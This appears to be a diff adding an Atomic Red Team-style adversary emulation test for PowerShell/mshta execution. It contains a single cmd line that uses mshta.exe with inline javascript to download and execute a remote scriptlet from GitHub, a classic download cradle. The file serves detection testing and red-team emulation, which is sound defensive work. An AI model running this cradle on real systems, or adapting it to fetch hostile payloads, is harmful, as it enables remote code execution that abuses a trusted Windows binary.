@@ -1,0 +1,8 @@
+#TechniqueName: Command and Scripting Interpreter: PowerShell
+#AtomicTestName: Powershell invoke mshta.exe download
+#Description: Powershell invoke mshta to download payload. Upon execution, a new PowerShell window will be opened which will display "Download Cradle test success!".&&Provided by https://github.com/mgreen27/mgreen27.github.io&
+#Language: cmd
+
+#commands
+C:\Windows\system32\cmd.exe /c "mshta.exe javascript:a=GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/mshta.sct').Exec();close()"
+
